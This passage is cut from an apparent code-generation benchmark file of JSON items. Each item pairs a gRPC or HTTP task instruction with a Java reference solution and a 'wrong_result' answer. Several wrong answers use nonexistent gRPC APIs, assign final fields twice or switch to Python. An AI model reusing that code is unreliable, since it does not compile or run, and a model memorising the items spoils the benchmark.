pair = new KVPair<>(false, response.get());\n        }\n        return pair;\n    }\n\n    protected <ReqT, RespT> void streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request,\n                                               StreamObserver<RespT> responseObserver,\n                                               int retry) throws PDException {\n        AbstractStub stub = getStub();\n        try {\n            ClientCall<ReqT, RespT> call = stub.getChannel().newCall(method, stub.getCallOptions());\n            ClientCalls.asyncServerStreamingCall(call, request, responseObserver);\n        } catch (Exception e) {\n            if (e instanceof StatusRuntimeException) {\n                if (retry < stubProxy.getHostCount()) {\n                    synchronized (this) {\n                        stubProxy.setStub(null);\n                    }\n                    streamingCall(method, request, responseObserver, ++retry);\n                    return;\n                }\n            }\n            log.error(\"rpc call with exception, {}\", e.getMessage());\n        }\n    }\n\n    @Override\n    public void close() {\n        closeChannel(channel);\n        if (stubs != null) {\n            for (AbstractBlockingStub stub : stubs.values()) {\n                closeChannel((ManagedChannel) stub.getChannel());\n            }\n        }\n    }\n\n    private void closeChannel(ManagedChannel channel) {\n        try {\n            while (channel != null &&\n                   !channel.shutdownNow().awaitTermination(100, TimeUnit.MILLISECONDS)) {\n                continue;\n            }\n        } catch (Exception e) {\n            log.info(\"Close channel with error : \", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "public abstract class AbstractClient {\n    protected final ConcurrentHashMap<String, ManagedChannel> chs = new ConcurrentHashMap<>();\n    protected AbstractClientStubProxy stubProxy;\n    protected PDConfig config;\n    protected ManagedChannel channel;\n    protected ConcurrentMap<String, AbstractBlockingStub> stubs = new ConcurrentHashMap<>();\n\n    public AbstractClient(PDConfig config) {\n        this.config = config;\n        stubProxy = new AbstractClientStubProxy();\n    }\n\n    public AbstractBlockingStub getBlockingStub() {\n        String address = config.getLeaderHost();\n        AbstractBlockingStub stub = stubs.get(address);\n        if (stub == null) {\n            stub = createBlockingStub();\n            stubs.put(address, stub);\n        }\n        return stub;\n    }\n\n    public AbstractStub getStub() {\n        String address = config.getLeaderHost();\n        AbstractStub stub = stubProxy.getStub(address);\n        if (stub == null) {\n            stub = createStub();\n            stubProxy.setStub(address, stub);\n        }\n        return stub;\n    }\n\n    protected abstract AbstractStub createStub();\n    protected abstract AbstractBlockingStub createBlockingStub();\n\n    public String resetStub() {\n        closeChannel(channel);\n        String leaderHost = config.getLeaderHost();\n        channel = ManagedChannelBuilder.forAddress(leaderHost, config.getPort()).usePlaintext().build();\n        stubs.clear();\n        stubs.put(leaderHost, getBlockingStub());\n        return leaderHost;\n    }\n\n    public <ReqT, RespT> RespT blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req) {\n        return blockingUnaryCall(method, req, 3);\n    }\n\n    public <ReqT, RespT> RespT blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) {\n        for (int i = 0; i < retry; i++) {\n            try {\n                return getBlockingStub().unaryCall(method, req);\n            } catch (Exception e) {\n                if (i == retry - 1) {\n                    throw new RuntimeException(\"Failed after \" + retry + \" retries\", e);\n                }\n                Thread.sleep(100 * (i + 1));\n            }\n        }\n        throw new RuntimeException(\"Failed after \" + retry + \" retries\");\n    }\n\n    public <ReqT, RespT> KVPair<Boolean, RespT> concurrentBlockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) {\n        List<String> hosts = config.getHosts();\n        List<KVPair<Boolean, RespT>> results = new ArrayList<>();\n        for (String host : hosts) {\n            try {\n                ManagedChannel channel = chs.computeIfAbsent(host, k -> ManagedChannelBuilder.forAddress(k, config.getPort()).usePlaintext().build());\n                AbstractBlockingStub stub = stubs.computeIfAbsent(host, k -> createBlockingStub());\n                RespT resp = stub.unaryCall(method, req);\n                boolean matched = predicate.test(resp);\n                results.add(new KVPair<>(matched, resp));\n            } catch (Exception e) {\n                // Log or handle exception\n            }\n        }\n        for (KVPair<Boolean, RespT> result : results) {\n            if (result.getKey()) {\n                return result;\n            }\n        }\n        return new KVPair<>(false, null);\n    }\n\n    public <ReqT, RespT> void streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request, StreamObserver<RespT> responseObserver, int retry) {\n        for (int i = 0; i < retry; i++) {\n            try {\n                getStub().startStreaming(method, request, responseObserver);\n                return;\n            } catch (Exception e) {\n                if (i == retry - 1) {\n                    throw new RuntimeException(\"Failed after \" + retry + \" retries\", e);\n                }\n                Thread.sleep(100 * (i + 1));\n            }\n        }\n        throw new RuntimeException(\"Failed after \" + retry + \" retries\");\n    }\n\n    public void close() {\n        closeChannel(channel);\n        chs.values().forEach(ManagedChannel::shutdown);\n        chs.clear();\n    }\n\n    protected void closeChannel(ManagedChannel channel) {\n        if (channel != null) {\n            channel.shutdownNow();\n        }\n    }\n}"
  },
  {
    "Task_id": 503,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for establishing and managing connections to a gRPC server, with methods to start the connection, retrieve the blocking stub, and shutdown the connection.\n\nClass Description: The GrpcClient class provides functionality to connect to a gRPC server using a ManagedChannel, create a blocking stub for synchronous communication, and properly shutdown the connection when done.\n\nAttributes:\n- channel: [ManagedChannel] - The channel used to communicate with the gRPC server\n- blockingStub: [WalletGrpc.WalletBlockingStub] - The blocking stub used to make synchronous RPC calls\n\nMethods:\n- startConnection(String host, int port) -> void - Establishes a connection to the gRPC server at the specified host and port, creating both the ManagedChannel and blocking stub\n- getBlockingStub() -> WalletGrpc.WalletBlockingStub - Returns the blocking stub for making RPC calls\n- shutdown() -> void - Shuts down the channel connection, waiting for up to 5 seconds for termination",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport org.tron.api.WalletGrpc;\nimport java.util.concurrent.TimeUnit;\n\npublic class GrpcClient {\n\n    private ManagedChannel channel;\n    private WalletGrpc.WalletBlockingStub blockingStub;\n\n    public void startConnection(String host, int port) {\n        channel = ManagedChannelBuilder.forAddress(host, port)\n            .usePlaintext()\n            .build();\n        blockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpc.WalletBlockingStub getBlockingStub() {\n        return blockingStub;\n    }\n\n    public void shutdown() throws InterruptedException {\n        if (channel != null) {\n            channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "public class GrpcClient {\n    private final ManagedChannel channel;\n    private final WalletGrpc.WalletBlockingStub blockingStub;\n\n    public GrpcClient() {\n        this.channel = ManagedChannelBuilder.forEndpoint(\"localhost\", 50051).usePlaintext().build();\n        this.blockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public void startConnection(String host, int port) {\n        channel.shutdownNow();\n        channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();\n        blockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpc.WalletBlockingStub getBlockingStub() {\n        return blockingStub;\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n        try {\n            channel.awaitTermination(5, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}"
  },
  {
    "Task_id": 504,
    "Instruction": "Task Description: Implement a function to test the gRPC Server Reflection service by establishing a connection to a gRPC server, sending a reflection request, and processing the response.\n\nFunction Description: The function connects to a gRPC server running on localhost at port 9090 using plaintext communication. It creates an asynchronous stub for the Server Reflection service, sends a request to list all available services, and processes the response. The function ensures proper cleanup by shutting down the channel after completion.\n\nInput: None (The target server address is hardcoded as \"localhost:9090\")\n\nOutput: None (The function processes the reflection response internally via the checkResult method, which is not shown in the reference code)",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.reflection.v1alpha.ServerReflectionGrpc;\nimport io.grpc.reflection.v1alpha.ServerReflectionGrpc.ServerReflectionStub;\nimport io.grpc.reflection.v1alpha.ServerReflectionRequest;\nimport io.grpc.reflection.v1alpha.ServerReflectionResponse;\nimport io.grpc.stub.StreamObserver;\n\nvoid testReflectionService() {\n    final ManagedChannel channel = ManagedChannelBuilder.forTarget(\"localhost:9090\").usePlaintext().build();\n    try {\n        final ServerReflectionStub stub = ServerReflectionGrpc.newStub(channel);\n\n        final AwaitableStreamObserver<ServerReflectionResponse> resultObserver = new AwaitableStreamObserver<>();\n        final StreamObserver<ServerReflectionRequest> requestObserver = stub.serverReflectionInfo(resultObserver);\n        requestObserver.onNext(ServerReflectionRequest.newBuilder()\n                .setListServices(\"\")\n                .build());\n        requestObserver.onCompleted();\n        checkResult(resultObserver);\n    } finally {\n        channel.shutdown();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 23,
    "wrong_result": "import asyncio\nimport grpc\nfrom grpc_reflection.v1beta1 import reflection\n\nasync def test_server_reflection():\n    async with grpc.aio.insecure_channel('localhost:9090') as channel:\n        stub = reflection.ServerReflectionServiceStub(channel)\n        request = reflection.ListServicesRequest()\n        response = await stub.ListServices(request)\n        # Process response internally via checkResult method (not shown)"
  },
  {
    "Task_id": 506,
    "Instruction": "Task Description: Implement a gRPC server in Java that handles streaming requests and responses, following the structure and functionality of the provided reference code.\n\nClass Description: The HelloWorldServer class represents a gRPC server that listens on a specified port and provides a streaming greeting service. It manages server lifecycle operations (start, stop, await termination) and implements the gRPC service interface for handling client requests.\n\nAttributes:\n- server: [Server] - The gRPC server instance that handles incoming requests\n- logger: [Logger] - Logger instance for server activity logging\n\nMethods:\n- start() -> [void] - Starts the gRPC server on the specified port (50051 by default) and registers a shutdown hook for graceful termination. Throws IOException if server fails to start.\n- stop() -> [void] - Initiates graceful shutdown of the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the calling thread until the server terminates. Throws InterruptedException if the thread is interrupted while waiting.\n\nNested Class:\n- GreeterImpl: [StreamingGreeterGrpc.StreamingGreeterImplBase] - Implements the gRPC service interface with streaming capabilities\n  Methods:\n  - sayHelloStreaming(HelloRequest req, StreamObserver<HelloReply> responseObserver) -> [void] - Handles client requests by sending multiple greeting responses in a stream. Takes a HelloRequest containing the client's name and a StreamObserver for sending responses. Sends three greeting messages with increasing excitement, then completes the stream.",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.examples.streaming.HelloReply;\nimport io.grpc.examples.streaming.HelloRequest;\nimport io.grpc.examples.streaming.StreamingGreeterGrpc;\nimport io.grpc.stub.StreamObserver;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n  private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n  private Server server;\n\n  public void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new GreeterImpl()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread() {\n              @Override\n              public void run() {\n                System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                HelloWorldServer.this.stop();\n                System.err.println(\"*** server shut down\");\n              }\n            });\n  }\n\n  public void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  public void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  static class GreeterImpl extends StreamingGreeterGrpc.StreamingGreeterImplBase {\n    @Override\n    public void sayHelloStreaming(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n      try {\n        logger.info(\"Saying hi\");\n        responseObserver.onNext(\n            HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build());\n        Thread.sleep(100);\n        logger.info(\"Saying hi\");\n        responseObserver.onNext(\n            HelloReply.newBuilder().setMessage(\"Hello \" + req.getName() + \"!\").build());\n        Thread.sleep(100);\n        logger.info(\"Saying hi\");\n        responseObserver.onNext(\n            HelloReply.newBuilder().setMessage(\"Hello \" + req.getName() + \"!!\").build());\n      } catch (InterruptedException e) {\n        responseObserver.onError(e);\n      } finally {\n        responseObserver.onCompleted();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "public class HelloWorldServer {\n    private final Server server;\n    private final Logger logger;\n\n    public HelloWorldServer() {\n        server = ServerBuilder.forPort(50051)\n                .addService(new GreeterImpl())\n                .build();\n        logger = LoggerFactory.getLogger(HelloWorldServer.class);\n    }\n\n    public void start() throws IOException {\n        server.start();\n        if (!server.isStarted()) {\n            throw new IOException(\"Failed to start server\");\n        }\n        logger.info(\"Server started on port 50051\");\n        Runtime.getRuntime().addShutdownHook(new Thread(this::stop));\n    }\n\n    public void stop() {\n        if (server.isStarted()) {\n            server.shutdown();\n            logger.info(\"Server shutting down\");\n        }\n    }\n\n    public void blockUntilShutdown() throws InterruptedException {\n        if (server.isStarted()) {\n            server.awaitTermination();\n        }\n    }\n\n    private static class GreeterImpl extends StreamingGreeterGrpc.StreamingGreeterImplBase {\n        @Override\n        public void sayHelloStreaming(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n            for (int i = 0; i < 3; i++) {\n                String message = \"Hello, \" + req.getName() + \"!\".repeat(i + 1);\n                responseObserver.onNext(HelloReply.newBuilder().setMessage(message).build());\n            }\n            responseObserver.onCompleted();\n        }\n    }\n}"
  },
  {
    "Task_id": 507,
    "Instruction": "Task Description: Create a gRPC server in Java that can handle multiple services, manage interceptors, and provide service discovery capabilities.\n\nClass Description: The GrpcServer class is responsible for initializing and managing a gRPC server instance. It handles server configuration, service registration, interceptor management, and provides methods for service discovery. The server can be started and stopped gracefully, and it maintains mappings of services and methods for lookup purposes.\n\nAttributes:\n- server: [Server] - The gRPC server instance\n- serviceNameMap: [Map<String, Class<? extends BindableService>>] - Mapping of service names to their implementation classes\n- fullMethodNameMap: [Map<String, Method>] - Mapping of full method names to their corresponding Method objects\n\nMethods:\n- GrpcServer: [Constructor](GrpcServerProperties properties, List<ServerInterceptor> interceptors, List<BindableService> services) -> [void] - Initializes the server with given properties, interceptors and services\n- GrpcServer: [Constructor](ServerBuilder<?> builder, GrpcServerProperties properties, List<ServerInterceptor> interceptors, List<BindableService> services) -> [void] - Alternative constructor accepting a pre-configured ServerBuilder\n- isRunning: [isRunning]() -> [boolean] - Checks if the server is currently running\n- port: [port]() -> [int] - Returns the port number the server is listening on\n- findClass: [findClass](ServiceDescriptor descriptor) -> [Class<? extends BindableService>] - Finds the implementation class for a given service descriptor\n- findMethod: [findMethod](MethodDescriptor<?, ?> descriptor) -> [Method] - Finds the Method object for a given method descriptor\n- resolve: [resolve](MethodDescriptor<?, ?> descriptor, Class<? extends BindableService> cls) -> [Method] - Resolves the Method object for a given method descriptor within a service class\n- onApplicationStart: [onApplicationStart]() -> [void] - Starts the server and begins awaiting termination\n- onApplicationStop: [onApplicationStop]() -> [void] - Shuts down the server gracefully",
    "Canonical_solution": "import io.grpc.BindableService;\nimport io.grpc.MethodDescriptor;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerInterceptor;\nimport io.grpc.ServerMethodDefinition;\nimport io.grpc.ServerServiceDefinition;\nimport io.grpc.ServiceDescriptor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.ListIterator;\nimport java.util.Map;\nimport java.util.Objects;\nimport java.util.concurrent.TimeUnit;\nimport org.ballcat.common.core.compose.ContextComponent;\nimport org.ballcat.common.thread.ThreadPool;\nimport org.ballcat.common.util.ClassUtils;\nimport org.ballcat.grpc.server.properties.GrpcServerProperties;\nimport org.springframework.core.annotation.AnnotationAwareOrderComparator;\n\npublic class GrpcServer implements ContextComponent {\n\n    private final Server server;\n    private final Map<String, Class<? extends BindableService>> serviceNameMap;\n    private final Map<String, Method> fullMethodNameMap;\n\n    public GrpcServer(GrpcServerProperties properties, List<ServerInterceptor> interceptors,\n            List<BindableService> services) {\n        this(ServerBuilder.forPort(properties.getPort()), properties, interceptors, services);\n    }\n\n    public GrpcServer(ServerBuilder<?> builder, GrpcServerProperties properties, List<ServerInterceptor> interceptors,\n            List<BindableService> services) {\n        builder\n            .maxInboundMessageSize((int) properties.getMessageSize().toBytes())\n            .keepAliveTime(properties.getKeepAliveTime(), TimeUnit.MILLISECONDS)\n            .keepAliveTimeout(properties.getKeepAliveTimeout(), TimeUnit.MILLISECONDS);\n\n        interceptors.sort(AnnotationAwareOrderComparator.INSTANCE);\n        ListIterator<ServerInterceptor> iterator = interceptors.listIterator(interceptors.size());\n        while (iterator.hasPrevious()) {\n            builder.intercept(iterator.previous());\n        }\n\n        this.serviceNameMap = new HashMap<>();\n        this.fullMethodNameMap = new HashMap<>();\n\n        for (BindableService service : services) {\n            builder.addService(service);\n            Class<? extends BindableService> cls = service.getClass();\n            ServerServiceDefinition serverServiceDefinition = service.bindService();\n            ServiceDescriptor serviceDescriptor = serverServiceDefinition.getServiceDescriptor();\n\n            this.serviceNameMap.put(serviceDescriptor.getName(), cls);\n\n            for (ServerMethodDefinition<?, ?> serverMethodDefinition : serverServiceDefinition.getMethods()) {\n                MethodDescriptor<?, ?> methodDescriptor = serverMethodDefinition.getMethodDescriptor();\n                String fullMethodName = methodDescriptor.getFullMethodName();\n                this.fullMethodNameMap.put(fullMethodName, resolve(methodDescriptor, cls));\n            }\n        }\n\n        this.server = builder.build();\n    }\n\n    public boolean isRunning() {\n        return !this.server.isShutdown() && !this.server.isTerminated();\n    }\n\n    public int port() {\n        return this.server.getPort();\n    }\n\n    public Class<? extends BindableService> findClass(ServiceDescriptor descriptor) {\n        return this.serviceNameMap.get(descriptor.getName());\n    }\n\n    public Method findMethod(MethodDescriptor<?, ?> descriptor) {\n        return this.fullMethodNameMap.get(descriptor.getFullMethodName());\n    }\n\n    protected Method resolve(MethodDescriptor<?, ?> descriptor, Class<? extends BindableService> cls) {\n        String bareMethodName = descriptor.getBareMethodName();\n        for (Method method : ClassUtils.methods(cls)) {\n            if (Objects.equals(method.getName(), bareMethodName)) {\n                return method;\n            }\n        }\n        return null;\n    }\n\n    public void onApplicationStart() {\n        this.server.start();\n        ThreadPool.instance().execute(\"GrpcServer\", this.server::awaitTermination);\n    }\n\n    public void onApplicationStop() {\n        this.server.shutdownNow();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerInterceptors;\nimport io.grpc.BindableService;\nimport io.grpc.ServiceDescriptor;\nimport io.grpc.MethodDescriptor;\nimport java.lang.reflect.Method;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.List;\n\npublic class GrpcServer {\n    private final Server server;\n    private final Map<String, Class<? extends BindableService>> serviceNameMap;\n    private final Map<String, Method> fullMethodNameMap;\n    private final GrpcServerProperties properties;\n    private final List<ServerInterceptor> interceptors;\n    private final List<BindableService> services;\n\n    public GrpcServer(GrpcServerProperties properties, List<ServerInterceptor> interceptors, List<BindableService> services) {\n        this.properties = properties;\n        this.interceptors = interceptors;\n        this.services = services;\n        ServerBuilder<?> serverBuilder = Server.builderForPort(properties.getPort());\n        for (ServerInterceptor interceptor : interceptors) {\n            serverBuilder.addInterceptor(interceptor);\n        }\n        for (BindableService service : services) {\n            serverBuilder.addService(service);\n        }\n        this.server = serverBuilder.build();\n        serviceNameMap = new HashMap<>();\n        for (BindableService service : services) {\n            serviceNameMap.put(service.getServiceDescriptor().getName(), service.getClass());\n        }\n        fullMethodNameMap = new HashMap<>();\n        for (BindableService service : services) {\n            for (MethodDescriptor<?, ?> method : service.getServiceDescriptor().getMethods()) {\n                String fullName = method.getFullMethodName();\n                Method methodObj = resolve(method, service.getClass());\n                fullMethodNameMap.put(fullName, methodObj);\n            }\n        }\n    }\n\n    public GrpcServer(ServerBuilder<?> builder, GrpcServerProperties properties, List<ServerInterceptor> interceptors, List<BindableService> services) {\n        this.properties = properties;\n        this.interceptors = interceptors;\n        this.services = services;\n        for (ServerInterceptor interceptor : interceptors) {\n            builder.addInterceptor(interceptor);\n        }\n        for (BindableService service : services) {\n            builder.addService(service);\n        }\n        this.server = builder.build();\n        serviceNameMap = new HashMap<>();\n        for (BindableService service : services) {\n            serviceNameMap.put(service.getServiceDescriptor().getName(), service.getClass());\n        }\n        fullMethodNameMap = new HashMap<>();\n        for (BindableService service : services) {\n            for (MethodDescriptor<?, ?> method : service.getServiceDescriptor().getMethods()) {\n                String fullName = method.getFullMethodName();\n                Method methodObj = resolve(method, service.getClass());\n                fullMethodNameMap.put(fullName, methodObj);\n            }\n        }\n    }\n\n    public boolean isRunning() {\n        return server.isRunning();\n    }\n\n    public int port() {\n        return properties.getPort();\n    }\n\n    public Class<? extends BindableService> findClass(ServiceDescriptor descriptor) {\n        String serviceName = descriptor.getName();\n        return serviceNameMap.get(serviceName);\n    }\n\n    public Method findMethod(MethodDescriptor<?, ?> descriptor) {\n        Class<? extends BindableService> serviceClass = findClass(descriptor.getServiceDescriptor());\n        return resolve(descriptor, serviceClass);\n    }\n\n    private Method resolve(MethodDescriptor<?, ?> descriptor, Class<? extends BindableService> cls) {\n        String methodName = descriptor.getMethodName();\n        try {\n            return cls.getDeclaredMethod(methodName, descriptor.getParameterTypes());\n        } catch (NoSuchMethodException e) {\n            throw new RuntimeException(\"Method not found\", e);\n        }\n    }\n\n    public void onApplicationStart() {\n        server.start();\n    }\n\n    public void onApplicationStop() {\n        server.shutdown();\n    }\n}\n\npublic class GrpcServerProperties {\n    private final int port;\n\n    public GrpcServerProperties(int port) {\n        this.port = port;\n    }\n\n    public int getPort() {\n        return port;\n    }\n}"
  },
  {
    "Task_id": 51,
    "Instruction": "Task Description: Create a function to test if a given URL is reachable by making an HTTP GET request and verifying the response code.\n\nFunction Description: The function attempts to connect to a specified URL using an HTTP GET request. It checks if the response code is HTTP_OK (200) to determine if the URL is reachable. The connection is properly closed after the check.\n\nInput: \n- strUrl: String - The URL to be tested for reachability\n\nOutput: \n- None (The function throws an exception if the URL is unreachable or if the response code is not HTTP_OK)",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic void testUrlReachable(String strUtl) throws Exception {\n    URL url = new URL(strUtl);\n    HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n    conn.setRequestMethod(\"GET\");\n    conn.connect();\n    int rc = conn.getResponseCode();\n    assertEquals(HttpURLConnection.HTTP_OK, rc);\n    conn.disconnect();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import requests\n\ndef is_url_reachable(strUrl):\n    try:\n        response = requests.get(strUrl)\n        if response.status_code != 200:\n            raise Exception(f\"URL {strUrl} is unreachable or not OK. Status code: {response.status_code}\")\n    except requests.exceptions.RequestException as e:\n        raise Exception(f\"Failed to reach URL {strUrl}: {e}\")"
  },
  {
    "Task_id": 510,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server using NettyServerBuilder to handle multiple language processing services.\n\nClass Description: The ZemberekGrpcServer class is responsible for initializing and managing a gRPC server that provides various Turkish language processing services. It uses Netty as the underlying transport layer and allows configuration of the server port and service implementations.\n\nAttributes:\n- port: [int] - The port number on which the gRPC server will listen for incoming connections.\n- context: [ZemberekContext] - The context object containing configuration and resources for language processing services.\n- DEFAULT_PORT: [static final int] - The default port number (6789) used when no specific port is provided.\n\nMethods:\n- Constructor: [ZemberekGrpcServer](int port, ZemberekGrpcConfiguration configuration) -> [void] - Initializes the server with the specified port and configuration.\n- getPort: [getPort]() -> [int] - Returns the port number the server is configured to use.\n- getContext: [getContext]() -> [ZemberekContext] - Returns the ZemberekContext object containing service configurations.\n- start: [start]() -> [void] - Starts the gRPC server, adds all service implementations, and begins listening for requests. This method blocks until the server terminates.\n- main: [main](String[] args) -> [void] - The entry point that creates and starts the server using default parameters.",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.netty.shaded.io.grpc.netty.NettyServerBuilder;\nimport zemberek.core.logging.Log;\n\npublic class ZemberekGrpcServer {\n\n    public static final int DEFAULT_PORT = 6789;\n\n    private final int port;\n    private ZemberekContext context;\n\n    public ZemberekGrpcServer(int port, ZemberekGrpcConfiguration configuration) {\n        this.port = port;\n        context = new ZemberekContext(configuration);\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public ZemberekContext getContext() {\n        return context;\n    }\n\n    public void start() throws Exception {\n        Server server = NettyServerBuilder.forPort(port)\n                .addService(new LanguageIdServiceImpl())\n                .addService(new PreprocessingServiceImpl())\n                .addService(new NormalizationServiceImpl(context))\n                .addService(new MorphologyServiceImpl(context))\n                .build()\n                .start();\n        Log.info(\"Zemberek grpc server started at port: \" + port);\n        server.awaitTermination();\n    }\n\n    public static void main(String[] args) throws Exception {\n        new ZemberekGrpcServer(DEFAULT_PORT, null).start();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "public class ZemberekGrpcServer {\n    private final int port;\n    private final ZemberekContext context;\n    public static final int DEFAULT_PORT = 6789;\n\n    public ZemberekGrpcServer(int port, ZemberekGrpcConfiguration configuration) {\n        this.port = port;\n        this.context = configuration.getContext();\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public ZemberekContext getContext() {\n        return context;\n    }\n\n    public void start() {\n        NettyServerBuilder builder = NettyServerBuilder.forPort(port);\n        builder.addService(context.getLanguageService());\n        builder.build().start();\n    }\n\n    public static void main(String[] args) {\n        ZemberekGrpcServer server = new ZemberekGrpcServer(DEFAULT_PORT, new ZemberekGrpcConfiguration());\n        server.start();\n    }\n}"
  },
  {
    "Task_id": 511,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server launcher for Spring Boot applications, capable of registering multiple gRPC services and managing server lifecycle.\n\nClass Description: The GrpcLauncher class is responsible for starting and managing a gRPC server in a Spring Boot application. It automatically discovers gRPC service beans, configures server parameters, and handles graceful shutdown. The class uses Lombok for logging and Spring's dependency injection.\n\nAttributes:\n- server: [Server] - The gRPC server instance\n- grpcServerPort: [Integer] - The port number for the gRPC server, injected from application properties\n- DEFAULT_MAX_MESSAGE_SIZE: [int] - Constant defining the maximum message size (10MB)\n\nMethods:\n- grpcStart: [grpcStart](Map<String, Object> grpcServiceBeanMap) -> void - Initializes and starts the gRPC server, registering all provided gRPC service beans. Handles server lifecycle and shutdown hooks.\n- grpcStop: [grpcStop]() -> void - Shuts down the gRPC server gracefully when called, typically during application termination.",
    "Canonical_solution": "import io.grpc.BindableService;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport java.io.IOException;\nimport java.util.Map;\n\n@Slf4j\n@Component(\"grpcLauncher\")\npublic class GrpcLauncher {\n\n    public static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024;\n\n    private Server server;\n\n    @Value(\"${server.grpc.port}\")\n    private Integer grpcServerPort;\n\n    public void grpcStart(Map<String, Object> grpcServiceBeanMap) {\n        try {\n            ServerBuilder serverBuilder = ServerBuilder.forPort(grpcServerPort);\n            for (Object bean : grpcServiceBeanMap.values()){\n                serverBuilder.addService((BindableService) bean);\n                log.info(\"{} is register in Spring Boot\", bean.getClass().getSimpleName());\n            }\n            server = serverBuilder\n                .maxInboundMessageSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .maxInboundMetadataSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .build().start();\n            log.info(\"grpc server is started at {}\", grpcServerPort);\n            server.awaitTermination();\n            Runtime.getRuntime().addShutdownHook(new Thread(this::grpcStop));\n        } catch (IOException | InterruptedException e){\n            e.printStackTrace();\n        }\n    }\n\n    private void grpcStop(){\n        if (server != null){\n            server.shutdownNow();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.util.Map;\nimport java.util.stream.Collectors;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\n@Slf4j\npublic class GrpcLauncher {\n\n    private final Server server;\n    private final int grpcServerPort;\n    private static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024; // 10MB\n\n    @Value(\"${grpc.server.port}\")\n    private int grpcServerPort;\n\n    public GrpcLauncher() {\n        // Constructor is empty, as the @Value is injected by Spring\n    }\n\n    public void grpcStart(Map<String, Object> grpcServiceBeanMap) {\n        ServerBuilder<Server> builder = Server.builder();\n        builder.maxInboundMessageSize(DEFAULT_MAX_MESSAGE_SIZE);\n        builder.bindPort(grpcServerPort);\n\n        // Register all services from the map\n        grpcServiceBeanMap.values().forEach(service -> {\n            if (service instanceof io.grpc.ServerService) {\n                builder.addService((io.grpc.ServerService) service);\n            }\n        });\n\n        server = builder.build();\n        server.start();\n\n        // Add shutdown hook\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            try {\n                server.shutdownNow();\n            } catch (Exception e) {\n                log.error(\"Error shutting down gRPC server\", e);\n            }\n        }));\n    }\n\n    public void grpcStop() {\n        if (server != null) {\n            server.shutdownNow();\n        }\n    }\n}"
  },
  {
    "Task_id": 513,
